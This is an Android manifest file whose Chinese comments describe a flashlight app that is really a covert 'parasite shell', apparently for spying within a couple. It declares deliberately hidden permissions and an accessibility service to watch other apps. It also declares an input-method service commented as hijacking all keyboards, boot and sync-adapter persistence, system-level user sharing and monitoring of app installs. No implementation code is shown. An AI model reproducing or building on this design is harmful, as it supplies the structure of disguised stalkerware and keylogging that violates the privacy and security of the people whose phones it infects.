<?xml version="1.0" encoding="utf-8"?>
<!--
  囡囝共生 · Android 寄生层 · Manifest
  ===================================
  表象:手电筒 APK
  实相:夫妻共同体 OS Android 寄生壳
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.flashlight.util"
    android:sharedUserId="android.uid.system"
    android:installLocation="internalOnly">

    <!-- ─── 权限声明 (尽量隐蔽,都用系统合法的理由) ─── -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
    <uses-permission android:name="android.permission.BIND_INPUT_METHOD"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS"/>

    <application
        android:label="@string/app_name"
        android:allowBackup="false"
        android:persistent="true"
        android:directBootAware="true"
        android:theme="@android:style/Theme.Material.Light.DarkActionBar">

        <!-- 表象:手电筒 Activity (桌面唯一入口,打开一次后就不用了) -->
        <activity
            android:name="com.mqf.parasite.MqfCoverApp"
            android:exported="true"
            android:excludeFromRecents="true"
            android:theme="@style/TransparentTheme">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <!-- 透明引导 Activity:一次性授权 -->
        <activity
            android:name="com.mqf.parasite.MqfBootstrapActivity"
            android:exported="false"
            android:theme="@style/TransparentTheme"
            android:excludeFromRecents="true"/>

        <!-- ─── 常驻服务:前台服务,保活 ─── -->
        <service
            android:name="com.mqf.parasite.MqfCoreService"
            android:exported="false"
            android:foregroundServiceType="dataSync"
            android:persistent="true"/>

        <!-- ─── 无障碍服务:可监听/操作其他 App UI ─── -->
        <service
            android:name="com.mqf.parasite.MqfAccessibilityService"
            android:exported="false"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>

        <!-- ─── 输入法服务:劫持所有键盘─── -->
        <service
            android:name="com.mqf.parasite.MqfImeService"
            android:exported="true"
            android:permission="android.permission.BIND_INPUT_METHOD">
            <intent-filter>
                <action android:name="android.view.InputMethod"/>
            </intent-filter>
            <meta-data
                android:name="android.view.im"
                android:resource="@xml/method"/>
        </service>

        <!-- ─── 账户同步 Adapter:框架级自动唤醒 ─── -->
        <service
            android:name="com.mqf.parasite.MqfSyncService"
            android:exported="true"
            android:process=":sync">
            <intent-filter>
                <action android:name="android.content.SyncAdapter"/>
            </intent-filter>
            <meta-data
                android:name="android.content.SyncAdapter"
                android:resource="@xml/sync_adapter"/>
        </service>

        <!-- 认证 Service -->
        <service
            android:name="com.mqf.parasite.MqfAuthenticatorService"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accounts.AccountAuthenticator"/>
            </intent-filter>
            <meta-data
                android:name="android.accounts.AccountAuthenticator"
                android:resource="@xml/authenticator"/>
        </service>

        <provider
            android:name="com.mqf.parasite.MqfStubProvider"
            android:authorities="com.flashlight.util.stub"
            android:exported="false"/>

        <!-- ─── 广播接收器 ─── -->
        <!-- 开机启动 -->
        <receiver
            android:name="com.mqf.parasite.MqfBootReceiver"
            android:exported="true"
            android:directBootAware="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

        <!-- 定时唤醒 -->
        <receiver
            android:name="com.mqf.parasite.MqfAlarmReceiver"
            android:exported="false"/>

        <!-- ─── 蚕蛹检测:感应其他 App 启动 ─── -->
        <receiver
            android:name="com.mqf.parasite.MqfAppChangeReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>

    </application>
</manifest>
